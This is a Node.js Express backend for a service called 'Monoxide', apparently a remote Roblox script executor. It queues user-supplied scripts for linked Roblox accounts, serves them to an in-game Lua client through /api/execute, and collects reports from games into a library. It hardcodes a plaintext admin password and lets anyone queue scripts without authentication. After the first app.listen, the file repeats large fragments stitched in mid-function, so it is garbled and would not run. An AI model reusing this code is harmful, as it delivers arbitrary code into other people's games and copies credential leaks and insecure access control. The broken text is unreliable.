const express = require('express');
const cors = require('cors');
const crypto = require('crypto');
const bcrypt = require('bcrypt');
const axios = require('axios');
const fs = require('fs');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(express.json({ limit: '1mb' }));
app.use(express.text({ type: 'text/plain' }));

// Ensure data directory exists
const DATA_DIR = path.join(__dirname, 'data');
if (!fs.existsSync(DATA_DIR)) {
    fs.mkdirSync(DATA_DIR, { recursive: true });
}

// File paths
const USERS_FILE = path.join(DATA_DIR, 'users.json');
const KEYS_FILE = path.join(DATA_DIR, 'keys.json');
const GAMES_FILE = path.join(DATA_DIR, 'games.json');

// In‑memory storage (loaded from files)
let games = new Map();
let users = new Map();
let validKeys = new Map();
let queuedScripts = new Map();
let linkedUsername = '';

// Load data from files
function loadData() {
    try {
        if (fs.existsSync(USERS_FILE)) {
            const data = JSON.parse(fs.readFileSync(USERS_FILE, 'utf8'));
            users = new Map(Object.entries(data));
        }
    } catch (e) { console.error('Failed to load users:', e.message); }

    try {
        if (fs.existsSync(KEYS_FILE)) {
            const data = JSON.parse(fs.readFileSync(KEYS_FILE, 'utf8'));
            validKeys = new Map(Object.entries(data));
        }
    } catch (e) { console.error('Failed to load keys:', e.message); }

    try {
        if (fs.existsSync(GAMES_FILE)) {
            const data = JSON.parse(fs.readFileSync(GAMES_FILE, 'utf8'));
            games = new Map(Object.entries(data));
        }
    } catch (e) { console.error('Failed to load games:', e.message); }
}

// Save functions
function saveUsers() {
    try {
        fs.writeFileSync(USERS_FILE, JSON.stringify(Object.fromEntries(users), null, 2));
    } catch (e) { console.error('Failed to save users:', e.message); }
}

function saveKeys() {
    try {
        fs.writeFileSync(KEYS_FILE, JSON.stringify(Object.fromEntries(validKeys), null, 2));
    } catch (e) { console.error('Failed to save keys:', e.message); }
}

function saveGames() {
    try {
        fs.writeFileSync(GAMES_FILE, JSON.stringify(Object.fromEntries(games), null, 2));
    } catch (e) { console.error('Failed to save games:', e.message); }
}

// Load existing data
loadData();

// ========================
// Helper: get Roblox ID
// ========================
async function getRobloxIdFromUsername(username) {
    try {
        const res = await axios.post('https://users.roblox.com/v1/usernames/users', {
            usernames: [username]
        });
        const data = res.data.data[0];
        return data ? data.id : null;
    } catch (err) {
        return null;
    }
}

// ========================
// Default admin account (CEO)
// ========================
(async () => {
    const adminEmail = 'admin@monoxide.local';
    if (!users.has(adminEmail)) {
        const adminPassword = 'jgoatman100';
        const hash = await bcrypt.hash(adminPassword, 10);
        users.set(adminEmail, {
            email: adminEmail,
            passwordHash: hash,
            username: 'tr0llzkidd',
            role: 'CEO',
            createdAt: Date.now()
        });
        saveUsers();
    }
})();

// ========================
// Admin key generation (CEO only)
// ========================
app.post('/api/admin/generate-key', (req, res) => {
    const { adminToken } = req.body;
    const adminUser = Array.from(users.values()).find(u => u.token === adminToken && u.role === 'CEO');
    if (!adminUser) return res.status(403).json({ error: 'Admin access required' });

    const segment = () => {
        const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
        let result = '';
        for (let i = 0; i < 4; i++) result += chars.charAt(Math.floor(Math.random() * chars.length));
        return result;
    };
    const key = `MONOXIDE_KEY_${segment()}-${segment()}-${segment()}`;
    validKeys.set(key, { createdAt: Date.now(), used: false });
    saveKeys();
    setTimeout(() => { validKeys.delete(key); saveKeys(); }, 7 * 24 * 60 * 60 * 1000);
    res.json({ key });
});

// ========================
// Verify key
// ========================
app.post('/api/verify-key', (req, res) => {
    const { key } = req.body;
    if (!key) return res.status(400).json({ error: 'Missing key' });
    const keyData = validKeys.get(key);
    if (!keyData) return res.status(401).json({ valid: false, error: 'Invalid or expired key' });
    if (keyData.used) return res.status(401).json({ valid: false, error: 'Key already used' });
    res.json({ valid: true });
});

// ========================
// Signup
// ========================
app.post('/api/signup', async (req, res) => {
    const { key, email, password, username } = req.body;
    if (!key || !email || !password || !username) {
        return res.status(400).json({ error: 'Missing fields' });
    }

    const keyData = validKeys.get(key);
    if (!keyData) return res.status(400).json({ error: 'Invalid or expired key' });
    if (keyData.used) return res.status(400).json({ error: 'Key already used' });
    if (users.has(email)) return res.status(400).json({ error: 'Email already registered' });

    const passwordHash = await bcrypt.hash(password, 10);
    const user = { email, passwordHash, username, role: 'MEMBER', createdAt: Date.now() };
    users.set(email, user);
    keyData.used = true;
    saveUsers();
    saveKeys();
    res.json({ success: true });
});

// ========================
// Login
// ========================
app.post('/api/login', async (req, res) => {
    const { email, password } = req.body;
    if (!email || !password) return res.status(400).json({ error: 'Missing fields' });

    const user = users.get(email);
    if (!user) return res.status(401).json({ error: 'Invalid email or password' });

    const match = await bcrypt.compare(password, user.passwordHash);
    if (!match) return res.status(401).json({ error: 'Invalid email or password' });

    const token = crypto.randomBytes(32).toString('hex');
    user.token = token;
    users.set(email, user);
    saveUsers();
    res.json({ success: true, token, username: user.username, role: user.role });
});

// ========================
// Verify token
// ========================
app.post('/api/verify-token', (req, res) => {
    const { token } = req.body;
    if (!token) return res.status(401).json({ valid: false });
    const user = Array.from(users.values()).find(u => u.token === token);
    if (!user) return res.status(401).json({ valid: false });
    res.json({ valid: true, username: user.username, role: user.role });
});

// ========================
// Set Roblox username
// ========================
app.post('/api/set-username', async (req, res) => {
    const { username, token } = req.body;
    if (!username || !token) return res.status(400).json({ error: 'Missing fields' });

    const user = Array.from(users.values()).find(u => u.token === token);
    if (!user) return res.status(401).json({ error: 'Invalid session' });

    const robloxId = await getRobloxIdFromUsername(username);
    if (!robloxId) return res.status(400).json({ error: 'Invalid Roblox username' });

    user.robloxUsername = username;
    user.robloxId = robloxId;
    users.set(user.email, user);
    linkedUsername = username;
    saveUsers();
    res.json({ success: true, robloxId, username });
});

// ========================
// Get linked username
// ========================
app.get('/api/getuser', (req, res) => {
    res.type('text/plain').send(linkedUsername || '');
});

// ========================
// Queue script
// ========================
app.post('/api/queue-script', (req, res) => {
    const { roblox_userid, script } = req.body;
    if (!roblox_userid || !script) return res.status(400).json({ error: 'Missing fields' });

    if (!queuedScripts.has(roblox_userid)) {
        queuedScripts.set(roblox_userid, []);
    }
    queuedScripts.get(roblox_userid).push({
        id: Date.now().toString() + Math.random().toString(36).substr(2, 5),
        code: Buffer.from(script).toString('base64'),
        status: 'QUEUED',
        queued_at: new Date().toISOString()
    });

    res.json({ success: true, queued: queuedScripts.get(roblox_userid).length });
});

// ========================
// Execute script
// ========================
app.get('/api/execute', (req, res) => {
    const { user } = req.query;
    if (!user) return res.status(400).send('');

    const userObj = Array.from(users.values()).find(u =>
        u.robloxUsername === user || u.username === user
    );
    if (!userObj || !userObj.robloxId) return res.send('');

    const scripts = queuedScripts.get(userObj.robloxId) || [];
    if (scripts.length === 0) return res.send('');

    const script = scripts.shift();
    queuedScripts.set(userObj.robloxId, scripts);

    const decoded = Buffer.from(script.code, 'base64').toString('utf-8');
    res.type('text/plain').send(decoded);
});

// ========================
// Game reporting
// ========================
app.post('/api/report', (req, res) => {
    const game = req.body;
    if (!game.id && !game.placeId) return res.status(400).json({ error: 'Missing placeId' });
    const placeId = game.id || game.placeId;
    const playing = game.players || game.playing || 0;

    const storedGame = {
        placeId,
        name: game.name || '',
        playing,
        thumbnail: game.thumbnail || '',
        visits: game.visits || '',
        creator: game.creator || '',
        creator_id: game.creator_id || '',
        maxPlayers: game.max_players || '',
        genre: game.genre || '',
        created: game.created || '',
        voice: game.voice || '',
        rig: game.rig || '',
        joinUrl: `https://www.roblox.com/games/${placeId}/-`,
        reportedAt: Date.now()
    };

    games.set(placeId.toString(), storedGame);
    saveGames();
    res.json({ success: true });
});

app.get('/api/games', (req, res) => {
    const now = Date.now();
    const oneHour = 60 * 60 * 1000;
    const activeGames = Array.from(games.values())
        .filter(g => g.playing > 0 && (now - g.reportedAt) < oneHour)
        .sort((a, b) => b.playing - a.playing);
    res.json(activeGames);
});

// ========================
// Health check
// ========================
app.get('/api/health', (req, res) => res.json({ status: 'ok' }));

// Cleanup old games
setInterval(() => {
    const now = Date.now();
    let changed = false;
    for (const [placeId, game] of games) {
        if (now - game.reportedAt > 3600000) {
            games.delete(placeId);
            changed = true;
        }
    }
    if (changed) saveGames();
}, 60 * 1000);

app.listen(PORT, () => console.log(`Server running on port ${PORT}`));    saveUsers();
    saveKeys();
    res.json({ success: true });
});

// ========================
// Login
// ========================
app.post('/api/login', async (req, res) => {
    const { email, password } = req.body;
    if (!email || !password) return res.status(400).json({ error: 'Missing fields' });

    const user = users.get(email);
    if (!user) return res.status(401).json({ error: 'Invalid email or password' });

    const match = await bcrypt.compare(password, user.passwordHash);
    if (!match) return res.status(401).json({ error: 'Invalid email or password' });

    const token = crypto.randomBytes(32).toString('hex');
    user.token = token;
    users.set(email, user);
    saveUsers();
    res.json({ success: true, token, username: user.username, role: user.role });
});

// ========================
// Verify token
// ========================
app.post('/api/verify-token', (req, res) => {
    const { token } = req.body;
    if (!token) return res.status(401).json({ valid: false });
    const user = Array.from(users.values()).find(u => u.token === token);
    if (!user) return res.status(401).json({ valid: false });
    res.json({ valid: true, username: user.username, role: user.role });
});

// ========================
// Set Roblox username
// ========================
app.post('/api/set-username', async (req, res) => {
    const { username, token } = req.body;
    if (!username || !token) return res.status(400).json({ error: 'Missing fields' });

    const user = Array.from(users.values()).find(u => u.token === token);
    if (!user) return res.status(401).json({ error: 'Invalid session' });

    const robloxId = await getRobloxIdFromUsername(username);
    if (!robloxId) return res.status(400).json({ error: 'Invalid Roblox username' });

    user.robloxUsername = username;
    user.robloxId = robloxId;
    users.set(user.email, user);
    linkedUsername = username;
    saveUsers();
    res.json({ success: true, robloxId, username });
});

// ========================
// Get linked username
// ========================
app.get('/api/getuser', (req, res) => {
    res.type('text/plain').send(linkedUsername || '');
});

// ========================
// Queue script
// ========================
app.post('/api/queue-script', (req, res) => {
    const { roblox_userid, script } = req.body;
    if (!roblox_userid || !script) return res.status(400).json({ error: 'Missing fields' });

    if (!queuedScripts.has(roblox_userid)) {
        queuedScripts.set(roblox_userid, []);
    }
    queuedScripts.get(roblox_userid).push({
        id: Date.now().toString() + Math.random().toString(36).substr(2, 5),
        code: Buffer.from(script).toString('base64'),
        status: 'QUEUED',
        queued_at: new Date().toISOString()
    });

    res.json({ success: true, queued: queuedScripts.get(roblox_userid).length });
});

// ========================
// Execute script
// ========================
app.get('/api/execute', (req, res) => {
    const { user } = req.query;
    if (!user) return res.status(400).send('');

    const userObj = Array.from(users.values()).find(u =>
        u.robloxUsername === user || u.username === user
    );
    if (!userObj || !userObj.robloxId) return res.send('');

    const scripts = queuedScripts.get(userObj.robloxId) || [];
    if (scripts.length === 0) return res.send('');

    const script = scripts.shift();
    queuedScripts.set(userObj.robloxId, scripts);

    const decoded = Buffer.from(script.code, 'base64').toString('utf-8');
    res.type('text/plain').send(decoded);
});

// ========================
// Game reporting
// ========================
app.post('/api/report', (req, res) => {
    const game = req.body;
    if (!game.id && !game.placeId) return res.status(400).json({ error: 'Missing placeId' });
    const placeId = game.id || game.placeId;
    const playing = game.players || game.playing || 0;

    const storedGame = {
        placeId,
        name: game.name || '',
        playing,
        thumbnail: game.thumbnail || '',
        visits: game.visits || '',
        creator: game.creator || '',
        creator_id: game.creator_id || '',
        maxPlayers: game.max_players || '',
        genre: game.genre || '',
        created: game.created || '',
        voice: game.voice || '',
        rig: game.rig || '',
        joinUrl: `https://www.roblox.com/games/${placeId}/-`,
        reportedAt: Date.now()
    };

    games.set(placeId.toString(), storedGame);
    saveGames();
    res.json({ success: true });
});

app.get('/api/games', (req, res) => {
    const now = Date.now();
    const oneHour = 60 * 60 * 1000;
    const activeGames = Array.from(games.values())
        .filter(g => g.playing > 0 && (now - g.reportedAt) < oneHour)
        .sort((a, b) => b.playing - a.playing);
    res.json(activeGames);
});

// ========================
// Health check
// ========================
app.get('/api/health', (req, res) => res.json({ status: 'ok' }));

// Cleanup old games
setInterval(() => {
    const now = Date.now();
    let changed = false;
    for (const [placeId, game] of games) {
        if (now - game.reportedAt > 3600000) {
            games.delete(placeId);
            changed = true;
        }
    }
    if (changed) saveGames();
}, 60 * 1000);

app.listen(PORT, () => console.log(`Server running on port ${PORT}`));    const user = users.get(email);
    if (!user) return res.status(401).json({ error: 'Invalid email or password' });

    const match = await bcrypt.compare(password, user.passwordHash);
    if (!match) return res.status(401).json({ error: 'Invalid email or password' });

    const token = crypto.randomBytes(32).toString('hex');
    user.token = token;
    users.set(email, user);
    res.json({ success: true, token, username: user.username, role: user.role });
});

// ========================
// Verify session token
// ========================
app.post('/api/verify-token', (req, res) => {
    const { token } = req.body;
    if (!token) return res.status(401).json({ valid: false });
    const user = Array.from(users.values()).find(u => u.token === token);
    if (!user) return res.status(401).json({ valid: false });
    res.json({ valid: true, username: user.username, role: user.role });
});

// ========================
// Link Roblox username (fetches ID and stores it)
// ========================
app.post('/api/set-username', async (req, res) => {
    const { username, token } = req.body;
    if (!username || !token) return res.status(400).json({ error: 'Missing fields' });

    const user = Array.from(users.values()).find(u => u.token === token);
    if (!user) return res.status(401).json({ error: 'Invalid session' });

    const robloxId = await getRobloxIdFromUsername(username);
    if (!robloxId) return res.status(400).json({ error: 'Invalid Roblox username' });

    user.robloxUsername = username;
    user.robloxId = robloxId;
    users.set(user.email, user);
    linkedUsername = username;

    res.json({ success: true, robloxId, username });
});

// ========================
// Get current linked username (used by Lua script)
// ========================
app.get('/api/getuser', (req, res) => {
    res.type('text/plain').send(linkedUsername || '');
});

// ========================
// Queue script for a user (called by Executor page)
// ========================
app.post('/api/queue-script', (req, res) => {
    const { roblox_userid, script } = req.body;
    if (!roblox_userid || !script) return res.status(400).json({ error: 'Missing fields' });

    if (!queuedScripts.has(roblox_userid)) {
        queuedScripts.set(roblox_userid, []);
    }
    queuedScripts.get(roblox_userid).push({
        id: Date.now().toString() + Math.random().toString(36).substr(2, 5),
        code: Buffer.from(script).toString('base64'),
        status: 'QUEUED',
        queued_at: new Date().toISOString()
    });

    res.json({ success: true, queued: queuedScripts.get(roblox_userid).length });
});

// ========================
// Execute: return next script for the given user
// ========================
app.get('/api/execute', (req, res) => {
    const { user } = req.query;
    if (!user) return res.status(400).send('');

    const userObj = Array.from(users.values()).find(u =>
        u.robloxUsername === user || u.username === user
    );
    if (!userObj || !userObj.robloxId) return res.send('');

    const scripts = queuedScripts.get(userObj.robloxId) || [];
    if (scripts.length === 0) return res.send('');

    const script = scripts.shift();
    queuedScripts.set(userObj.robloxId, scripts);

    const decoded = Buffer.from(script.code, 'base64').toString('utf-8');
    res.type('text/plain').send(decoded);
});

// ========================
// Game reporting (for Game Library)
// ========================
app.post('/api/report', (req, res) => {
    const game = req.body;
    if (!game.id && !game.placeId) return res.status(400).json({ error: 'Missing placeId' });
    const placeId = game.id || game.placeId;
    const playing = game.players || game.playing || 0;

    const storedGame = {
        placeId,
        name: game.name || '',
        playing,
        thumbnail: game.thumbnail || '',
        visits: game.visits || '',
        creator: game.creator || '',
        creator_id: game.creator_id || '',
        maxPlayers: game.max_players || '',
        genre: game.genre || '',
        created: game.created || '',
        voice: game.voice || '',
        rig: game.rig || '',
        joinUrl: `https://www.roblox.com/games/${placeId}/-`,
        reportedAt: Date.now()
    };

    games.set(placeId, storedGame);
    res.json({ success: true });
});

app.get('/api/games', (req, res) => {
    const now = Date.now();
    const oneHour = 60 * 60 * 1000;
    const activeGames = Array.from(games.values())
        .filter(g => g.playing > 0 && (now - g.reportedAt) < oneHour)
        .sort((a, b) => b.playing - a.playing);
    res.json(activeGames);
});

// ========================
// Health check
// ========================
app.get('/api/health', (req, res) => res.json({ status: 'ok' }));

// Cleanup old games every minute
setInterval(() => {
    const now = Date.now();
    const oneHour = 60 * 60 * 1000;
    for (const [placeId, game] of games) {
        if (now - game.reportedAt > oneHour) games.delete(placeId);
    }
}, 60 * 1000);

app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
